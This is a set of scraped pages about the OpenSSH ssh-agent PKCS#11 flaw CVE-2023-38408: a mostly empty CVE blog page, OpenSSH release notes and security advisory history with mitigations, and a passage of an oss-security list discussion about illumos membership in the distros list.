=== Content from www.vicarius.io_1074a1d0_20250110_133633.html ===


 [about](/vsociety/about) [by vicarius](https://vicarius.io/) [log in](/vsociety/sign/in) [join community](/vsociety/sign/up)

* [scripts](/vsociety/posts)
* [CVEs](/vsociety/vulnerabilities)
* [apps](/vsociety/products)
* [OS](/vsociety/operating-systems)

 [by @jakaba](/vsociety/users/jakaba)28 Mar 20240401317#cve\_analysis

Write a blog analysis for a CVE

[publish](/vsociety/sign/in)see all related posts
# Exploring OpenSSH's Agent Forwarding RCE (CVE-2023-38408)

 [by @jakaba](/vsociety/users/jakaba)04 [by @jakaba](/vsociety/users/jakaba)28 Mar 20240401317#cve\_analysis

Write a blog analysis for a CVE

[publish](/vsociety/sign/in)see all related posts
# Exploring OpenSSH's Agent Forwarding RCE (CVE-2023-38408)

CVEs

[CVE-2023-38408](/vsociety/vulnerabilities/cve-2023-38408)9.8 Critical Severity

Apps

O[Openssh](/vsociety/products/20465_50136/openssh)Openbsd3.0.1P1.\*4.1P1.\*4.0P1.\*2.9.9P2.\*3.7.1P1.\*3.6.1P1.\*3.2.3P1.\*3.0P1.\*3.8.1P1.\*3.2.2P1.\*

show all related Apps

O[Openssh-Client](/vsociety/products/20509_103723/openssh-client)Openssh7.9.\*8.4.\*8.7.\*7.4.\*8.2.\*9.1.\*8.1.\*6.7.\*7.6.\*6.0.\*O[Openssh-Client](/vsociety/products/23916_103723/openssh-client)Ubuntu8.8.\*7.9.\*8.4.\*8.7.\*7.7.\*8.9.\*6.6.\*9.3.\*8.2.\*7.3.\*
## Screenshots from the blog posts

![images/club15awlnyp91hmv5geuaygd.jpg](data:image/svg+xml;charset=UTF-8...)![images/club15awlnyp91hmv5geuaygd.jpg](data:image/svg+xml;charset=UTF-8...)
## Summary

The `ssh-agent` acts as a key manager for SSH authentication, facilitating agent forwarding to bypass the need to keep keys on remote hosts. NIST assigned the CVE identifier CVE-2023-38408 on July 19th in response to a critical vulnerability in OpenSSH's PKCS#11 feature prior to version 9.3p2.

## Description

Tags

[#RCE](/vsociety/search?hashtags=rce)[#exposed\_to\_RCE\_attack](/vsociety/search?hashtags=exposed_to_rce_attack)[#trending](/vsociety/search?hashtags=trending)[#CVE-2023-38408](/vsociety/search?hashtags=cve-2023-38408)[#openssh](/vsociety/search?hashtags=openssh)[![users/photos/clj8b3h1k16g10uoihwvzgsxi.png](data:image/svg+xml;charset=UTF-8...)](/vsociety/users/jakaba)[@jakaba](/vsociety/users/jakaba)

74 posts

subscribe to user

Total vcoins

64.3K

Social media links

jakabakos@MrJakaba92Akos Jakab

show more

 remediate more CVEs with vRx  [explore more](https://www.vicarius.io/?utm_source=vsociety&utm_medium=organic&utm_campaign=cve_scripts%26analysis) Comments (0)submitshow 5 more replies[![users/photos/clj8b3h1k16g10uoihwvzgsxi.png](data:image/svg+xml;charset=UTF-8...)](/vsociety/users/jakaba)[@jakaba](/vsociety/users/jakaba)

74 posts

subscribe to user

Total vcoins

64.3K

Share

Social media links

jakabakos@MrJakaba92Akos Jakab

show more

CVEs

[CVE-2023-38408](/vsociety/vulnerabilities/cve-2023-38408)9.8 Critical Severity

Apps

O[Openssh](/vsociety/products/20465_50136/openssh)Openbsd3.0.1P1.\*4.1P1.\*4.0P1.\*2.9.9P2.\*3.7.1P1.\*3.6.1P1.\*3.2.3P1.\*3.0P1.\*3.8.1P1.\*3.2.2P1.\*

show all related Apps

O[Openssh-Client](/vsociety/products/20509_103723/openssh-client)Openssh7.9.\*8.4.\*8.7.\*7.4.\*8.2.\*9.1.\*8.1.\*6.7.\*7.6.\*6.0.\*O[Openssh-Client](/vsociety/products/23916_103723/openssh-client)Ubuntu8.8.\*7.9.\*8.4.\*8.7.\*7.7.\*8.9.\*6.6.\*9.3.\*8.2.\*7.3.\*

Tags

[#RCE](/vsociety/search?hashtags=rce)[#exposed\_to\_RCE\_attack](/vsociety/search?hashtags=exposed_to_rce_attack)[#trending](/vsociety/search?hashtags=trending)[#CVE-2023-38408](/vsociety/search?hashtags=cve-2023-38408)[#openssh](/vsociety/search?hashtags=openssh)

Democratizing infosec research for a more secure society. Be a part of the movement.

##### about

* [An Origin Story: vsociety](/vsociety/posts/an-origin-story-vsociety)
* [Frequently Asked Questions](/vsociety/faq)
##### be Part

* [Join Community](/vsociety/sign/up)
* [Login](/vsociety/sign/in)
##### legal

* [Privacy Policy](/vsociety/privacy-policy)
* [Terms of Use](/vsociety/terms)

Copyright © Vicarius 2022. [Privacy Policy](https://www.vicarius.io/privacy) and [Terms of Use](/vsociety/terms)



=== Content from www.openssh.com_a27b656e_20250110_133631.html ===
OpenSSH 9.3p2 was released on 2023-07-19. It is available from the
mirrors listed at https://www.openssh.com/.
OpenSSH is a 100% complete SSH protocol 2.0 implementation and
includes sftp client and server support.
Once again, we would like to thank the OpenSSH community for their
continued support of the project, especially those who contributed
code or patches, reported bugs, tested snapshots or donated to the
project. More information on donations may be found at:
https://www.openssh.com/donations.html
Changes since OpenSSH 9.3
=========================
This release fixes a security bug.
Security
========
Fix CVE-2023-38408 - a condition where specific libaries loaded via
ssh-agent(1)'s PKCS#11 support could be abused to achieve remote
code execution via a forwarded agent socket if the following
conditions are met:
\* Exploitation requires the presence of specific libraries on
the victim system.
\* Remote exploitation requires that the agent was forwarded
to an attacker-controlled system.
Exploitation can also be prevented by starting ssh-agent(1) with an
empty PKCS#11/FIDO allowlist (ssh-agent -P '') or by configuring
an allowlist that contains only specific provider libraries.
This vulnerability was discovered and demonstrated to be exploitable
by the Qualys Security Advisory team.
In addition to removing the main precondition for exploitation,
this release removes the ability for remote ssh-agent(1) clients
to load PKCS#11 modules by default (see below).
Potentially-incompatible changes
--------------------------------
\* ssh-agent(8): the agent will now refuse requests to load PKCS#11
modules issued by remote clients by default. A flag has been added
to restore the previous behaviour "-Oallow-remote-pkcs11".
Note that ssh-agent(8) depends on the SSH client to identify
requests that are remote. The OpenSSH >=8.9 ssh(1) client does
this, but forwarding access to an agent socket using other tools
may circumvent this restriction.
Checksums:
==========
- SHA1 (openssh-9.3p2.tar.gz) = 219cf700c317f400bb20b001c0406056f7188ea4
- SHA256 (openssh-9.3p2.tar.gz) = IA6+FH9ss/EB/QzfngJEKvfdyimN/9n0VoeOfMrGdug=
Please note that the SHA256 signatures are base64 encoded and not
hexadecimal (which is the default for most checksum tools). The PGP
key used to sign the releases is available from the mirror sites:
https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/RELEASE\_KEY.asc
Reporting Bugs:
===============
- Please read https://www.openssh.com/report.html
Security bugs should be reported directly to openssh@openssh.com


=== Content from www.openssh.com_a7a97da4_20250110_133631.html ===


OpenSSH: Security

## [*Open***SSH**](/) Security

---

OpenSSH is developed with the same rigorous security process that the
OpenBSD group is famous for. If you wish to report a security issue in
OpenSSH, please contact the private developers list <openssh@openssh.com>.

For more information, see the
[OpenBSD security page](https://www.openbsd.org/security.html).

* **July 1, 2024**

  sshd(8) in Portable OpenSSH versions 8.5p1 to 9.7p1 (inclusive).

  Race condition resulting in potential remote code execution.

  A race condition in sshd(8) could allow remote code execution as
  root on non-OpenBSD systems. This attack could be prevented by
  disabling the login grace timeout (LoginGraceTime=0 in
  sshd\_config) though this makes denial-of service against
  sshd(8) considerably easier.

  For more information, please refer to the
  [release notes](txt/release-9.8) and the report from the
  [Qualys Security Advisory Team](https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt) who discovered the bug.* **July 1, 2024**

    ssh(1) in OpenSSH versions 9.5p1 to 9.7p1 (inclusive).

    Logic error in ObscureKeystrokeTiming option.

    A logic error in the implementation of the ssh(1) ObscureKeystrokeTiming
    option rendered the feature ineffective and additionally exposed limited
    keystroke timing information when terminal echo was disabled, e.g. while
    entering passwords to su(8) or sudo(8). This condition could be avoided
    for affected versions by disabling the feature using
    ObscureKeystrokeTiming=no.

    For more information, please refer to the
    [release notes](txt/release-9.8).* **December 18, 2023**

      ssh(1), sshd(8) in OpenSSH prior to version 9.6.

      Weakness in initial key exchange ("Terrapin Attack")

      A weakness in the initial SSH protocol key exchange allows an
      on-path attacker to delete a number of consecutive messages from
      the early encrypted protocol without detection. While cryptographically
      novel, there is no discernable impact on the integrity of SSH traffic
      beyond giving the attacker the ability to delete the message that
      enables some features related to keystroke timing obfuscation.

      This attack is prevented by a new protocol extension in OpenSSH 9.6.

      For more information, please refer to the
      [release notes](txt/release-9.6).* **December 18, 2023**

        ssh-agent(1) in OpenSSH between 8.9 and 9.5 (inclusive)

        Incomplete application of destination constraints to smartcard keys.

        Destination constraints added when loading PKCS#11 keys from a token
        were being applied to only the first key returned from the token.

        This bug is corrected in OpenSSH 9.6.

        For more information, please refer to the
        [release notes](txt/release-9.6).* **July 19, 2023**

          ssh-agent(1) in OpenSSH between and 5.5 and 9.3p1 (inclusive)
          remote code execution relating to PKCS#11 providers

          The PKCS#11 support ssh-agent(1) could be abused to achieve remote
          code execution via a forwarded agent socket if the following conditions
          are met:
          + Exploitation requires the presence of specific libraries on the victim system.
          + Remote exploitation requires that the agent was forwarded to an attacker-controlled system.Exploitation can also be prevented by starting ssh-agent(1) with an
          empty PKCS#11/FIDO allowlist (ssh-agent -P '') or by configuring
          an allowlist that contains only specific provider libraries.

          This vulnerability was discovered and demonstrated to be exploitable
          by the Qualys Security Advisory team. This vulnerability has been
          assigned CVE-2023-38408.

          This bug is corrected in OpenSSH 9.3p2. For OpenBSD, an
          [errata](https://www.openbsd.org/errata.html)
          patch exists to fix this problem.

          For more information, please refer to the
          [release notes](txt/release-9.3p2).* **March 15, 2023**

            ssh-add(1) in OpenSSH between and 8.9 and 9.2 (inclusive).

            ssh-add(1) did not apply destination constraints to smartcard keys.

            When adding smartcard keys to ssh-agent(1) with the per-hop destination
            constraints (*ssh-add -h ...*), a logic error prevented the
            constraints from being communicated to the agent. This resulted in the
            keys being added without constraints. The common cases of
            non-smartcard keys and keys without destination constraints are
            unaffected.

            This bug is corrected in OpenSSH 9.3.

            For more information, please refer to the
            [release notes](txt/release-9.3).* **February 2, 2023**

              ssh(1) in OpenSSH between and 8.7 and 9.1 (inclusive).

              ssh(1) failed to correctly process PermitRemoteOpen options.

              The PermitRemoteOpen option
              would ignore its first argument unless it was one of the special
              keywords "any" or "none", causing the permission list to fail open
              if only one permission was specified.

              This bug is corrected in OpenSSH 9.2.

              For more information, please refer to the
              [release notes](txt/release-9.2).* **February 2, 2023**

                ssh(1) in OpenSSH between and 6.5 and 9.1 (inclusive).

                ssh(1) failed to check DNS names returned from libc for validity.

                If the CanonicalizeHostname and CanonicalizePermittedCNAMEs
                options were enabled, and the system/libc resolver did not check
                that names in DNS responses were valid, then use of these options
                could allow an attacker with control of DNS to include invalid
                characters (possibly including wildcards) in names added to
                known\_hosts files when they were updated. These names would still
                have to match the CanonicalizePermittedCNAMEs allow-list, so
                practical exploitation appears unlikely.

                This bug is corrected in OpenSSH 9.2.

                For more information, please refer to the
                [release notes](txt/release-9.2).* **February 2, 2023**

                  sshd in OpenSSH between and 9.1 (only).

                  Double-free memory fault in pre-authentication sshd process.

                  sshd(8) contained a network-reachable pre-authentication double-free
                  memory fault introduced in OpenSSH 9.1. This is not believed to be
                  exploitable, and it occurs in the unprivileged pre-auth process that is
                  subject to chroot(2) and is further sandboxed on most major
                  platforms.

                  This bug is corrected in OpenSSH 9.2.

                  For more information, please refer to the
                  [release notes](txt/release-9.2).* **September 26, 2021**

                    sshd in OpenSSH between 6.2 and 8.7 (inclusive).

                    sshd(8) failed to correctly initialise supplemental groups when
                    executing an `AuthorizedKeysCommand` or
                    `AuthorizedPrincipalsCommand`, where a
                    `AuthorizedKeysCommandUser` or
                    `AuthorizedPrincipalsCommandUser` directive was been set to
                    run the command as a non-root user. Instead these commands would inherit
                    the groups that sshd(8) was started with.

                    Depending on system configuration, inherited groups may allow
                    the helper programs to gain unintended privilege.

                    Neither `AuthorizedKeysCommand` nor
                    `AuthorizedPrincipalsCommand` are enabled by default in
                    sshd\_config(5).

                    This bug is corrected in OpenSSH 8.8

                    For more information, please refer to the
                    [release notes](txt/release-8.8).* **March 3, 2021**

                      ssh-agent in OpenSSH between 8.2 and 8.4 (inclusive).

                      Double-free memory corruption. Mitigated by socket peer user identity
                      checking and double-free protection in malloc(3).
                      This bug is corrected in OpenSSH 8.5
                      For more information, please refer to the
                      [release notes](txt/release-8.5).* **October 3, 2017**

                        All version of OpenSSH prior to 7.6 supporting read-only mode in sftp-server
                        (introduced in 5.5).
                        Incorrect open(2) flags in sftp-server permitted creation
                        of zero-length files when the server was running in read-only mode (invoked
                        using the -R command-line flag).

                        This bug is corrected in OpenSSH 7.6.
                        For more information, please refer to the
                        [release notes](txt/release-7.6).* **March 9, 2016**

                          All versions of OpenSSH prior to 7.2p2 with X11Forwarding
                          enabled.
                          Missing sanitisation of untrusted input allows an
                          authenticated user who is able to request X11 forwarding
                          to inject commands to xauth(1).

                          Mitigate by setting **X11Forwarding=no** in sshd\_config, or on the
                          commandline. This is the default, but some vendors enable the feature.

                          For more information see [the advisory](txt/x11fwd.adv).

                          This bug is corrected in OpenSSH 7.2p2 and in OpenBSD's stable branch.
                          For more information, please
                          refer to the [release notes](txt/release-7.2p2).* **January 14, 2016**

                            OpenSSH clients between versions 5.4 and 7.1 are vulnerable to
                            information disclosure that may allow a malicious server to retrieve
                            information including under some circumstances, user's private keys.
                            This may be mitigated by adding the undocumented config option
                            **UseRoaming no** to ssh\_config.

                            For more information see [CVE-2016-0777](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0777) and [CVE-2016-0778](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0778).

                            This bug is corrected in OpenSSH 7.1p2 and in OpenBSD's stable branch.
                            For more information, please
                            refer to the [release notes](txt/release-7.1p2).* **August 21, 2015**

                              OpenSSH 7.0 contained a logic error in PermitRootLogin=
                              prohibit-password/without-password that could, depending on
                              compile-time configuration, permit password authentication to
                              root while preventing other forms of authentication.

                              This bug is corrected in OpenSSH 7.1. For more information, please
                              refer to the [release
                              notes](https://www.openssh.com/txt/release-7.1)* **August 11, 2015**

                                OpenSSH 6.7 through 6.9 assign weak permissions to TTY devices.

                                Keyboard-interactive authentication in OpenSSH prior to 7.0 may
                                allow circumvention of MaxAuthTries.

                                These bugs are corrected in OpenSSH 7.0. For more information, please
                                refer to the [release
                                notes](https://www.openssh.com/txt/release-7.0)* **June 30, 2015**

                                  OpenSSH prior to 6.9 suffered from a race condition that could allow
                                  non-trusted X11 forwarding sessions to be treated as trusted.
                                  For more information, please
                                  refer to the [release
                                  notes](https://www.openssh.com/txt/release-6.9)* **November 8, 2013:**

                                    OpenSSH versions 6.2 and 6.3 are vulnerable to the memory corruption
                                    problem described in the
                                    [gcmrekey.adv](https://www.openssh.com/txt/gcmrekey.adv) advisory
                                    and the
                                    [OpenSSH 6.4 release notes](https://www.openssh.com/txt/release-6.4).* **February 2, 2011:**

                                      Portable OpenSSH prior to version 5.8p2 is vulnerable to the local
                                      host key theft attack described in
                                      [portable-keysign-rand-helper.adv](https://www.openssh.com/txt/portable-keysign-rand-helper.adv) advisory
                                      and the
                                      [OpenSSH 5.8p2 release notes](https://www.openssh.com/txt/release-5.8p2).* **January 24, 2011:**

                                        OpenSSH versions 5.6 and 5.7 are vulnerable to a potential leak of
                                        private key data described in the
                                        [legacy-cert.adv](https://www.openssh.com/txt/legacy-cert.adv) advisory
                                        and the
                                        [OpenSSH 5.8 release notes](https://www.openssh.com/txt/release-5.8).* **February 23, 2009:**

                                          OpenSSH prior to version 5.2 is vulnerable to the protocol
                                          weakness described in
                                          [CPNI-957037 "Plaintext Recovery Attack Against SSH"](http://www.cpni.gov.uk/Docs/Vulnerability_Advisory_SSH.txt).
                                          However, based on the limited information available it appears that this
                                          described attack is infeasible in most circumstances. For more
                                          information please refer to the
                                          [cbc.adv](https://www.openssh.com/txt/cbc.adv) advisory
                                          and the
                                          [OpenSSH 5.2 release notes](https://www.openssh.com/txt/release-5.2).* **July 22, 2008:**

                                            Portable OpenSSH 5.1 and newer are not vulnerable to the X11UseLocalhost=no hijacking attack
                                            on HP/UX (and possibly other systems) described in the
                                            [OpenSSH 5.1 release notes](https://www.openssh.com/txt/release-5.1).* **April 3, 2008:**

                                              OpenSSH 5.0 and newer are not vulnerable to the X11 hijacking attack
                                              described in
                                              [CVE-2008-1483](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1483) and the
                                              [OpenSSH 5.0 release notes](https://www.openssh.com/txt/release-5.0).* **March 31, 2008:**

                                                OpenSSH 4.9 and newer do not execute ~/.ssh/rc for sessions whose command
                                                has been overridden with a sshd\_config(5) *ForceCommand* directive.
                                                This was a documented, but unsafe behaviour (described in
                                                [OpenSSH 4.9 release notes](https://www.openssh.com/txt/release-4.9)).* **September 5, 2007:**

                                                  OpenSSH 4.7 and newer do not fall back to creating trusted X11
                                                  authentication cookies when untrusted cookie generation fails (e.g. due to
                                                  deliberate resource exhaustion), as described in the
                                                  [OpenSSH 4.7 release notes](https://www.openssh.com/txt/release-4.7).* **November 7, 2006:**

                                                    OpenSSH 4.5 and newer fix a weakness in the privilege separation monitor
                                                    that could be used to spoof successful authentication (described in the
                                                    [OpenSSH 4.5 release notes](https://www.openssh.com/txt/release-4.5)).
                                                    Note that exploitation of this vulnerability would require an attacker to
                                                    have already subverted the network-facing sshd(8) process, and no
                                                    vulnerabilities permitting this are known.* **September 27, 2006:**

                                                      OpenSSH 4.4 and newer is not vulnerable to the unsafe signal handler
                                                      vulnerability described in the
                                                      [OpenSSH 4.4 release notes](https://www.openssh.com/txt/release-4.4).* **September 27, 2006:**

                                                        OpenSSH 4.4 and newer is not vulnerable to the SSH protocol 1 denial of
                                                        service attack described in the
                                                        [OpenSSH 4.4 release notes](https://www.openssh.com/txt/release-4.4).* **February 1, 2006:**

                                                          OpenSSH 4.3 and newer are not vulnerable to shell metacharacter expansion
                                                          in scp(1) local-local and remote-remote copies
                                                          ([CVE-2006-0225](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-0225)), as described in the
                                                          [OpenSSH 4.3 release notes](https://www.openssh.com/txt/release-4.3).* **September 1, 2005:**

                                                            OpenSSH 4.2 and newer does not allow delegation of GSSAPI credentials
                                                            after authentication using a non-GSSAPI method as described in the
                                                            [OpenSSH 4.2 release notes](https://www.openssh.com/txt/release-4.2).* **September 1, 2005:**

                                                              OpenSSH 4.2 and newer do not incorrectly activate GatewayPorts for
                                                              dynamic forwardings (bug introduced in OpenSSH 4.0) as described in the
                                                              [OpenSSH 4.2 release notes](https://www.openssh.com/txt/release-4.2).* **September 16, 2003:**

                                                                Portable OpenSSH 3.7.1p2 and newer are not vulnerable to
                                                                "September 23, 2003: Portable OpenSSH Multiple PAM vulnerabilities",
                                                                [OpenSSH
                                                                Security Advisory](https://www.openssh.com/txt/sshpam.adv). (This issue does not affect OpenBSD versions)* **September 16, 2003:**

                                                                  OpenSSH 3.7.1 and newer are not vulnerable to
                                                                  "September 16, 2003: OpenSSH Buffer Management bug",
                                                                  [OpenSSH
                                                                  Security Advisory](https://www.openssh.com/txt/buffer.adv) and CERT Advisory
                                                                  [CA-2003-24](http://www.cert.org/advisories/CA-2003-24.html).* **August 1, 2002:**

                                                                    OpenSSH version 3.2.2p1, 3.4p1 and 3.4 were trojaned on the
                                                                    OpenBSD FTP server and potentially propagated via the normal
                                                                    mirroring process to other FTP servers. The code was inserted
                                                                    some time between the 30th and 31th of July. We replaced the
                                                                    trojaned files with their originals at 7AM MDT, August 1st:
                                                                    [OpenBSD
                                                                    Advisory](https://www.openbsd.org/advisories/ssh_trojan.txt).* **June 26, 2002:**

                                                                      OpenSSH 3.4 and newer are not vulnerable to
                                                                      "June 26, 2002: OpenSSH Remote Challenge Vulnerability",
                                                                      [OpenSSH
                                                                      Security Advisory](https://www.openssh.com/txt/preauth.adv).* **March 29, 2002:**

                                                                        OpenSSH 3.2.1 and newer are not vulnerable to
                                                                        "April 21, 2002: Buffer overflow in AFS/Kerberos token passing code",
                                                                        [OpenSSH
                                                                        Security Advisory](https://www.openbsd.org/advisories/ssh_afstoken.txt):
                                                                        Versions prior to OpenSSH 3.2.1 allow privileged access if
                                                                        AFS/Kerberos token passing is compiled in and enabled (either
                                                                        in the system or in sshd\_config).* **March 7, 2002:**

                                                                          OpenSSH 3.1 and newer are not vulnerable to
                                                                          "March 7, 2002: Off-by-one error in the channel code",
                                                                          [OpenSSH
                                                                          Security Advisory](https://www.openbsd.org/advisories/ssh_channelalloc.txt).* **November 24, 2001:**

                                                                            OpenSSH 3.0.2 and newer do not
                                                                            allow users to [pass environment variables to login(1) if UseLogin is enabled](http://www.kb.cert.org/vuls/id/157447).
                                                                            The UseLogin option is disabled by default in all OpenSSH releases.* **May 21, 2001:**

                                                                              OpenSSH 2.9.9 and newer are not vulnerable to
                                                                              "Sep 26, 2001: Weakness in OpenSSH's source IP based access control
                                                                              for SSH protocol v2 public key authentication.",
                                                                              [OpenSSH
                                                                              Security Advisory](https://www.openbsd.org/advisories/ssh_option.txt).* **May 21, 2001:**

                                                                                OpenSSH 2.9.9 and newer do not
                                                                                allow users to [delete files named "cookies" if X11 forwarding is enabled](http://www.kb.cert.org/vuls/id/655259).
                                                                                X11 forwarding is disabled by default.* **November 6, 2000:**

                                                                                  OpenSSH 2.3.1, a development snapshot which was never released, was
                                                                                  vulnerable to
                                                                                  "Feb 8, 2001: Authentication By-Pass Vulnerability in OpenSSH-2.3.1",
                                                                                  [OpenBSD
                                                                                  Security Advisory](https://www.openbsd.org/advisories/ssh_bypass.txt).
                                                                                  In protocol 2, authentication could be bypassed if public key
                                                                                  authentication was permitted. This problem does exist only
                                                                                  in OpenSSH 2.3.1, a three week internal development release.
                                                                                  OpenSSH 2.3.0 and versions newer than 2.3.1 are not vulnerable to
                                                                                  this problem.* **November 6, 2000:**

                                                                                    OpenSSH 2.3.0 and newer do not allow
                                                                                    [malicious servers to access the client's X11 display or ssh-agent](http://www.kb.cert.org/vuls/id/363181).
                                                                                    This problem has been fixed in OpenSSH 2.3.0.* **November 6, 2000:**

                                                                                      OpenSSH 2.3.0 and newer are not vulnerable to the
                                                                                      "Feb 8, 2001: SSH-1 Daemon CRC32 Compensation Attack Detector Vulnerability",
                                                                                      [RAZOR Bindview Advisory CAN-2001-0144](http://razor.bindview.com/publish/advisories/adv_ssh1crc.html).
                                                                                      A buffer overflow in the CRC32 compensation attack detector can
                                                                                      lead to remote root access. This problem has been fixed in
                                                                                      OpenSSH 2.3.0. However, versions prior to 2.3.0 are vulnerable.* **September 2, 2000:**

                                                                                        OpenSSH 2.2.0 and newer are not vulnerable to the
                                                                                        "Feb 7, 2001: SSH-1 Session Key Recovery Vulnerability",
                                                                                        CORE-SDI Advisory CORE-20010116. OpenSSH imposes limits on the
                                                                                        connection rate, making the attack unfeasible. Additionally, the
                                                                                        Bleichenbacher oracle has been closed completely since January 29,
                                                                                        2001.* **June 8, 2000:**

                                                                                          OpenSSH 2.1.1 and newer do not allow a remote attacker to
                                                                                          [execute arbitrary commands with the privileges of sshd if UseLogin](http://www.kb.cert.org/vuls/id/40327)
                                                                                          is enabled by the administrator. UseLogin is disabled by default.
                                                                                          This problem has been fixed in OpenSSH 2.1.1.* OpenSSH was never vulnerable to the
                                                                                            "Feb 5, 2001: SSH-1 Brute Force Password Vulnerability",
                                                                                            [Crimelabs Security Note CLABS200101](http://www.crimelabs.net/).* OpenSSH was not vulnerable to the RC4 cipher
                                                                                              [password cracking](http://www.kb.cert.org/vuls/id/565052),
                                                                                              [replay](http://www.kb.cert.org/vuls/id/665372), or
                                                                                              [modification](http://www.kb.cert.org/vuls/id/25309)
                                                                                              attacks. At the time that OpenSSH was started, it was already known
                                                                                              that SSH 1 used the RC4 stream cipher completely incorrectly, and
                                                                                              thus RC4 support was removed.* OpenSSH was not vulnerable to
                                                                                                [client forwarding attacks](http://www.kb.cert.org/vuls/id/684820)
                                                                                                in unencrypted connections, since unencrypted connection support was
                                                                                                removed at OpenSSH project start.* OpenSSH was not vulnerable to IDEA-encryption algorithm
                                                                                                  [attacks on the last packet](http://www.kb.cert.org/vuls/id/315308),
                                                                                                  since the IDEA algorithm is not supported. The patent status of IDEA makes
                                                                                                  it unsuitable for inclusion in OpenSSH.* OpenSSH does not treat localhost as exempt from host key checking,
                                                                                                    thus making it not vulnerable to the
                                                                                                    [host key authentication bypass](http://www.kb.cert.org/vuls/id/786900)
                                                                                                    attack.* OpenSSH was not vulnerable to
                                                                                                      [uncontrollable X11 forwarding](http://www.kb.cert.org/vuls/id/118892)
                                                                                                      attacks because X11-forwarding is disabled by default and the user can
                                                                                                      de-permit it.* OpenSSH has the SSH 1 protocol deficiency that might make an insertion attack
                                                                                                        difficult but possible. The CORE-SDI
                                                                                                        [deattack mechanism](http://www2.corest.com/common/showdoc.php?idx=131&idxseccion=10)
                                                                                                        is used to eliminate
                                                                                                        the common case. SSH 1 protocol support is disabled by default.



=== Content from www.openwall.com_41e98876_20250110_133622.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](8) [[next>]](10) [[<thread-prev]](../../../2023/09/18/1) [[thread-next>]](11) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20230922172755.GA18909@openwall.com>
Date: Fri, 22 Sep 2023 19:27:55 +0200
From: Solar Designer <solar@...nwall.com>
To: oss-security@...ts.openwall.com
Subject: Re: illumos (or at least danmcd) membership in the distros list

On Mon, Sep 18, 2023 at 05:36:13PM +0000, Dan McDonald wrote:
> On Sep 15, 2023, at 5:09 PM, Solar Designer <solar@...nwall.com> wrote:
> > Can you show illumos fixing non-illumos-only security issues within days
> > after public disclosure, so that a few days of advance notice would have
> > made those fixes even quicker?
>
> It's a per-illumos-distro property.  OmniOS has Stable & LTS releases.   Here's the current-stable
> release notes, dynamically updated every time they update:
>
> 	<https://github.com/omniosorg/omnios-build/blob/r151046/doc/ReleaseNotes.md>
>
> So I'm not sure if a few days of advance notice would make those quicker,
> but I do know that other distros have biweekly scheduled releases, and advance
> notice there would keep those wheels spinning faster.  Esp. since "patch tuesday"
> is a mere one-day before the release branch is forked off on release weeks.

This looks pretty good for OmniOS, e.g. for OpenSSL CVE-2023-3817 it
appears to be 4 days from OpenSSL advisory on "31st July 2023" to OmniOS
"r151046n (2023-08-03)", and even something like 1 day for OpenSSH
update to "9.3p2, fixing CVE-2023-38408" and for "AMD CPU microcode
updated to 20230719, mitigating CVE-2023-20593 on some Zen2 processors"
in "r151046m (2023-07-25)" (it was brought to oss-security on July 24).

That page above goes back to May 2023.  Were there separate ones for
older releases?  For "a publicly verifiable track record, dating back at
least 1 year and continuing to present day".

> Our security coordination in illumos is to warn distro-runners, and they make their own
> decisions based on that data. None have ever violated embargos.

This sounds very different from how the existing distros list members
operate.  In fact, it may be inconsistent with our current policy for
list members, which says:

<https://oss-security.openwall.org/wiki/mailing-lists/distros#list-policy-and-instructions-for-members>

"Aside from your participation in discussions with the reporter and on
the (linux-)distros lists (including possibly continuing to CC other
prior recipients of the information), the information you receive
through the (linux-)distros lists must not be made public, shared, nor
even hinted at anywhere beyond the need-to-know within your distro's
team except with the reporter's explicit approval, until the agreed upon
public disclosure date/time or substantially complete publication by
others.  Neither you nor others you inform may use the information for
anything other than getting the issue fixed for your distro's users and,
only in rare extreme cases, for deployment of maximally non-revealing
changes to maintain security of your distro's infrastructure most
essential to the distro users' security in face of the security issue
being dealt with.  The need-to-know condition is met only if the person
needs to participate in one of these two activities."

Note the words "within your distro's team".  However, now you say you'll
"warn distro-runners", and in your first message you wrote:

> Like Linux, we have downstream distros.  Unlike Linux, illumos is more
> than what Linux would call, "kernel".

So you'd be joining as upstream for multiple other distros, who you'd be
sharing the info with.  I'd say that per the current criteria and policy
for members, those individual distros would need to qualify and join (or
not) one by one.  I actually doubt all of them would meet our current
criteria, so your warning all of them would be a bypass.

Now, given good enough reasons, the criteria could be changed or an
exception could be made.  I think illumos is a great project, it's great
that you have a distro ecosystem, and several people I recognize have
spoken in favor (including off-list).  However, I am not convinced we
have a case here where we'd want to accept indirect sharing of info with
distros some of which might not qualify on their own.  If we were to do
